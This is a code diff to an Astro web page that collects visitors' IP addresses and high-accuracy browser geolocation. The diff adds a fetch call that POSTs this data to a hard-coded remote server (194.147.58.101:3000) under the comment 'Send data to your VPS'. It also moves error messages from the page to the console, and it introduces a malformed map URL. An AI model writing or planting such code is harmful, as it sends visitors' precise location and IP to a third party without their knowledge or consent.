@@ -31,28 +31,56 @@ import Layout from '../layouts/Layout.astro';
                       } else {
                         locationString += `Latitude: ${latitude}, Longitude: ${longitude}`;
                       }
-                      document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, ${locationString}`;
 
-                      const mapLink = `http://www.google.com/maps?q=${latitude},${longitude}`; // Updated map link
+                      // --- Send data to your VPS ---
+                      const data = {
+                        ip: ipAddress,
+                        location: locationString
+                      };
+
+                      fetch('http://194.147.58.101:3000/send-location', { // Replace with your VPS address and port
+                        method: 'POST',
+                        headers: {
+                          'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data),
+                      })
+                      .then(response => {
+                          if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
+                          }
+                          return response.json();
+                        })
+                      .then(result => {
+                          console.log('Location data sent successfully:', result);
+                        })
+                      .catch(error => {
+                          console.error('Error sending location data:', error);
+                        });
+                      // --- End send data to VPS ---
+
+                      // The rest of the code for displaying info and map link:
+                      document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, ${locationString}`;
+                      const mapLink = `http://www.google.com/maps?q=$/{latitude},${longitude}`;
                       const mapLinkElement = document.getElementById('map-link');
-                      mapLinkElement.innerHTML = `<a href="${mapLink}" target="_blank" rel="noopener noreferrer">View on Google Maps</a>`; // Added rel="noopener noreferrer"
+                      mapLinkElement.innerHTML = `<a href="${mapLink}" target="_blank" rel="noopener noreferrer">View on Google Maps</a>`;
                       mapLinkElement.style.display = 'block';
                     })
                   .catch(error => {
-                      document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, Location: Could not determine location. Error: ${error.message}`;
+                      console.error('Error getting location details:', error);
                     });
                 },
                 (error) => {
-                  document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, Location: Could not determine location. Error: ${error.message}`;
+                  console.error('Error getting geolocation:', error);
                 },
                 { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
               );
             } else {
-              document.getElementById('visitor-info').textContent = "IP Address: " + ipAddress + "\nGeolocation is not supported by this browser.";
+              console.error('Geolocation is not supported by this browser.');
             }
           })
         .catch(error => {
-            document.getElementById('visitor-info').textContent = "Could not get IP address. Error: " + error;
+            console.error('Could not get IP address:', error);
           });
       }
 
